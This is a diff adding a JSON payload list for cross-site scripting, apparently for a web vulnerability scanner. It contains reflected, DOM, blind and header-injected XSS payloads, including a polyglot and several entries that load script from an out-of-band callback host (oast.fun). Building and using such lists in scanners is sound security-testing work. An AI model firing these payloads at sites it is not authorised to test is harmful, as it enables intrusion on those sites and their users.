@@ -1,0 +1,29 @@
+{
+  "vulnerability": "Cross-Site Scripting",
+  "category": "xss",
+  "dialects": {
+    "reflected": [
+      {"name": "Script Tag", "type": "reflected", "payload": "<script>alert(1)</script>", "oast": false},
+      {"name": "IMG Onerror", "type": "reflected", "payload": "<img src=x onerror=alert(1)>", "oast": false},
+      {"name": "SVG Onload", "type": "reflected", "payload": "<svg onload=alert(1)>", "oast": false},
+      {"name": "Body Onload", "type": "reflected", "payload": "<body onload=alert(1)>", "oast": false},
+      {"name": "IMG Onerror OAST", "type": "oast", "payload": "<img src=http://{oast_id}.oast.fun/xss>", "oast": true},
+      {"name": "Script SRC OAST", "type": "oast", "payload": "<script src=http://{oast_id}.oast.fun/xss></script>", "oast": true},
+      {"name": "Polyglot XSS", "type": "reflected", "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e", "oast": false}
+    ],
+    "dom": [
+      {"name": "DOM XSS InnerHTML", "type": "dom", "payload": "<img src=x onerror=alert(1)>", "oast": false},
+      {"name": "DOM XSS Eval", "type": "dom", "payload": "\");alert(1)//", "oast": false},
+      {"name": "DOM XSS HREF", "type": "dom", "payload": "javascript:alert(1)", "oast": false}
+    ],
+    "blind": [
+      {"name": "Blind XSS OAST Script", "type": "oast", "payload": "<script src=http://{oast_id}.oast.fun/bxss></script>", "oast": true},
+      {"name": "Blind XSS OAST IMG", "type": "oast", "payload": "\"><img src=http://{oast_id}.oast.fun/bxss>", "oast": true}
+    ],
+    "header_based": [
+      {"name": "X-Forwarded-For", "type": "header", "payload": "<script>alert(1)</script>", "header": "X-Forwarded-For", "oast": false},
+      {"name": "User-Agent", "type": "header", "payload": "<script>alert(1)</script>", "header": "User-Agent", "oast": false},
+      {"name": "Referer", "type": "header", "payload": "<script>alert(1)</script>", "header": "Referer", "oast": false}
+    ]
+  }
+}
